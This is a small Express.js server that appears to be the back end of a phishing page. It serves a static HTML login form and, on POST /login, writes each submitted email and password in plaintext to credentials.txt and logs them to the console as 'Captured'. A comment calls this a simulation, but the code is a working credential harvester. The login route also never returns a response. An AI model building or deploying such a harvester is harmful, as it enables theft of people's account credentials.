const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the static HTML file
app.use(express.static(__dirname));

// Route to handle login submissions
app.post("/login", (req, res) => {
    const { email, password } = req.body;

    // Log the credentials to a file (simulation)
    fs.appendFileSync("credentials.txt", `\nEmail: ${email}, Password: ${password}\n`);
    console.log(`Captured: Email: ${email}, Password: ${password}`);

});

// Start the server
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
